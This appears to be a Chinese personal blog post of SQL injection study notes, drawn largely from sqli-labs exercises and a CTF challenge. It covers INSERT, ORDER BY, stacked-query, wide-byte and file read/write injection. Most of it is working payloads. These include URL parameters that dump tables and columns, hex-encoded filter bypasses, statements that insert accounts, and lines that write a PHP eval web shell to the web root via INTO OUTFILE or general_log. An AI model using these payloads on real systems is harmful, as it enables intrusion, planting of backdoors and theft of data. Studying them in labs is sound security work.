<h2 id="Insert-amp-Update-注入"><a href="#Insert-amp-Update-注入" class="headerlink" title="Insert&amp;Update 注入"></a>Insert&amp;Update 注入</h2><ul>
<li><strong>闭合括号：</strong><ul>
<li><strong>insert：</strong>可以依次提交如下输入：<code>foo&#39;)-- - foo&#39;,1)-- - foo&#39;,1,1)-- - 等</code> ，直到创建了想要的信息</li>
</ul>
</li>
<li><strong>数据回显：</strong><ul>
<li>构造语句使将查询的内容插入到数据库，然后根据网页上的显示获得数据。</li>
<li>但是MySQL一般不支持，使用+连接字符串，而是使用空格连接字符串。但是空格<strong>无法连接字符串 与 查询命令</strong></li>
<li><strong>思路：</strong>字符串与数字相加，相当于0+数字，就可以将要查询的字符串转换成十六进制，再转换成10进制，然后与字符串相加（即：+0 不变）<ul>
<li><code>insert into stu(id,name) values(1,&#39;test&#39; + conv(hex(user()),16,10) );</code></li>
<li>但是conv() 支持最大的数 <code>0xFFFFFFFFFFFFFFFF</code> 有限制（即最多八个字符），可以用字符串截取函数分段截取。</li>
</ul>
</li>
</ul>
</li>
<li><strong>使用报错：</strong><ul>
<li><code>insert into stu(id,name) values(1,&#39;test&#39; and extravtvalue(xxx));</code></li>
<li>insert into user(username,password) values(‘xxxx’,’ xxxx’),(‘dddd’,’dddd’)/* ‘); </li>
</ul>
</li>
<li><strong>使用延时：</strong><ul>
<li><code>insert into stu(id,name) values(1,&#39;test&#39; and if(xxx,sleep(5),0));</code></li>
</ul>
</li>
</ul>
<h2 id="order-by后的注入"><a href="#order-by后的注入" class="headerlink" title="order by后的注入"></a>order by后的注入</h2><ul>
<li>报错注入：<code>order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</code></li>
<li>bool盲注：<code>order by IF((bool),1,0)</code> 这个比较特殊，并不会按照IF的返回值排序，利用方法时间盲注。另一种：<code>order by IF ((bool) ,1,(select 1 union select 2))</code> bool=false 时，返回后一个结果，但是后一个返回两行数据造成报错，如果为真则不报错。</li>
<li><code>order by rand(true) or rand(false)</code></li>
</ul>
<h2 id="SQL约束注入"><a href="#SQL约束注入" class="headerlink" title="SQL约束注入"></a>SQL约束注入</h2><h2 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h2><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">less-07</span><br><span class="line">my.ini [mysqld] 后面添加secure_file_priv&#x3D;&#39;&#39;</span><br><span class="line">?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;D:\\phpStudy\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\a.txt&quot;--+</span><br><span class="line">?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\test.php&quot;--+</span><br></pre></td></tr></table></figure>



<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162742818.png" alt="image-20200724162742818"></p>
<ul>
<li><code>load_file(绝对路径) select ... into outfile &#39;绝对路径&#39;</code></li>
<li><strong>使用编码：</strong><ul>
<li><code>load_file(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</code></li>
<li><code>load_file(0x433a5c5c544553542e747874)</code></li>
<li><code>select 0x...... into outfile &#39;xxx&#39;</code></li>
<li><code>hex(load_file(path)) 加载二进制数据</code></li>
</ul>
</li>
<li><strong>利用 general_log 写文件(必须是root权限，当outfile被禁时)：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用方向：phpMyAdmin，开启-secure-file-priv选项，禁止执行 outfile，需要知道网站绝对路径</span><br><span class="line">show variables like &#39;%general%&#39;; #查看当前日志位置</span><br><span class="line">set global general_log &#x3D; on; #默认关闭，现在开启</span><br><span class="line">set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;html&#x2F;www&#x2F;xxx.php&#39;; #设置日志存储位置，创建shell文件</span><br><span class="line">select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;; #被保存到shell里</span><br></pre></td></tr></table></figure>

<p>必备条件：</p>
<p>读：file权限必备</p>
<p>写：1.绝对路径 2.union使用 3. 可以使用’’ </p>
<p>————————-读———————-                    </p>
<p>mysql3.x读取方法</p>
<p>create table a(cmd text);</p>
<p>load data infile ‘c:\xxx\xxx\xxx.txt’ into table a;</p>
<p>select * from a;</p>
<p>mysql4.x读取方法</p>
<p>除上述方法还可以使用load_file()</p>
<p>create table a(cmd text);</p>
<p>insert into a(cmd) values(load_file(‘c:\ddd\ddd\ddd.txt’));</p>
<p>select * from a;</p>
<p>mysql5.x读取方法</p>
<p>上述两种都可以</p>
<p>读取文件技巧：</p>
<p>load_file(char(32,26,56,66))</p>
<p>load_file(0x633A5C626F6F742E696E69)</p>
<p>————写————————–</p>
<p>into outfile写文件</p>
<p>union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*</p>
<p>union select 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
<p>不像寻常的sql注入一样要用到select where   绕waf方式:用16进制编码</p>
<p>1’;show databases;#       <del>1’;show database()#</del> </p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725221517562.png" alt="image-20200725221517562"></p>
<p>1’;show tables;#   只能看当前的表 我也不知道当前的表是ctftraining还是supersqli还是test  最后确认当前表是supersqli  error 1146 : Table ‘supersqli.words’ doesn’t exist</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725221606747.png" alt="image-20200725221606747"></p>
<p>1’;show columns from <code>1919810931114514</code>;#        <del>1’;show columns from  1919810931114514;#</del> 要用反引号括起来  一个数字字符串用作表名的时候要用反引号包裹</p>
<p>用于重命名表的alter 和 rename 没有被过滤</p>
<p>words表是默认表 重命名1919810931114514表为words</p>
<p><del>1’;alter table words  rename to  words1;#</del></p>
<p><del>1’;alter table <code>1919810931114514</code>  rename to words;#</del>   不能分两次执行只能一次 </p>
<p>1’;alter table words  rename to  words1;alter table <code>1919810931114514</code>  rename to words;alter table words change flag  id varchar(50);#     varchar(50)为原来flag字段的类型</p>
<p>1’or 1=1# 用万能钥匙来得到flag 一开始万能密码查到的也是words表下面的字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less-38</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;;insert into users(id,username,password) values(17,&#39;test7&#39;,&#39;007&#39;)--+</span><br></pre></td></tr></table></figure>



<blockquote>
<p>限制条件：必须支持堆叠查询才行</p>
<p>可以插入管理员账号等</p>
<p>PHP中的：<code>multi_query</code> 可以堆叠查询 </p>
</blockquote>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162734076.png" alt="image-20200724162734076"></p>
<p><strong>使用预处理语句绕过过滤：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set @sql&#x3D;0x...................; 0x....是经过十六进制编码的SQL语句</span><br><span class="line">prepare @sql; excute @sql; 准备和执行</span><br><span class="line"></span><br><span class="line">1&#39;;set @a&#x3D;select * from &#96;1919810931114514&#96;;#    select * from &#96;1919810931114514&#96;这句话千万™不要写错了</span><br><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a; excute execsql;#</span><br><span class="line">返回：strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)  要用大小写来绕过  strstr可以用大小写来绕过</span><br><span class="line">1&#39;;SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a; execute execsql;#   可以执行成功</span><br><span class="line">or</span><br><span class="line">1&#39;;SeT @sql&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare @sql; execute @sql;#   不行 估计格式不对</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726093411245.png" alt="image-20200726093411245"></p>
<p>​              <img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726093636222.png" alt="image-20200726093636222"> </p>
<p>进阶一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%23</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x666c6167%23</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1%df%27%20union%20select%201,group_concat(flag)%20from%20flag%23</span><br></pre></td></tr></table></figure>





<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Less-32</span><br><span class="line">?id=-1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------爆表名</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span>%df<span class="string">'union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=0x656d61696c73--+</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------爆列名</span></span><br><span class="line"><span class="string">?id=-1%df'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">group_concat</span>(email_id) <span class="keyword">from</span> security.emails<span class="comment">--+</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------爆数据</span></span><br></pre></td></tr></table></figure>



<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162715417.png" alt></p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162721889.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用%df来吃掉 </span><br><span class="line">对‘进行转义后为\&#39;  $id &#x3D; addslashes($id);</span><br><span class="line">多出的反斜杠</span><br></pre></td></tr></table></figure>







<h2 id="关于mysql"><a href="#关于mysql" class="headerlink" title="关于mysql:"></a>关于mysql:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service mysql start</span><br><span class="line">mysqladmin -u root password 123456</span><br><span class="line">mysql -u root -p </span><br><span class="line">show databases;                        </span><br><span class="line">create database db;</span><br><span class="line">use mysql;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/" data-id="clmvoc26g0001jg7kdyl73td5" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/11/29/rce/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          rce
        
      </div>
    </a>
  
  
    <a href="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">文件上传</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Coppersmith/" rel="tag">Coppersmith</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GraphiQL/" rel="tag">GraphiQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rsa/" rel="tag">rsa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sage/" rel="tag">sage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unctf/" rel="tag">unctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" rel="tag">大统一场理论</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Coppersmith/" style="font-size: 10px;">Coppersmith</a> <a href="/tags/GraphiQL/" style="font-size: 10px;">GraphiQL</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">php伪协议</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/sage/" style="font-size: 10px;">sage</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/unctf/" style="font-size: 10px;">unctf</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" style="font-size: 10px;">大统一场理论</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 20px;">密码学</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">文件读取</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/24/%E5%89%8D%E7%AB%AF/">前端</a>
          </li>
        
          <li>
            <a href="/2023/04/20/%E6%89%94%E5%87%BA%E5%8E%BB%E7%9A%84%E9%83%A8%E5%88%86/">扔出去的部分</a>
          </li>
        
          <li>
            <a href="/2023/04/20/%E4%B8%96%E7%95%8C%E8%A7%82/">世界观</a>
          </li>
        
          <li>
            <a href="/2022/10/01/%E6%9D%82/">杂</a>
          </li>
        
          <li>
            <a href="/2021/05/15/%E7%BD%91%E6%96%87/">网文</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 zhiliya<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>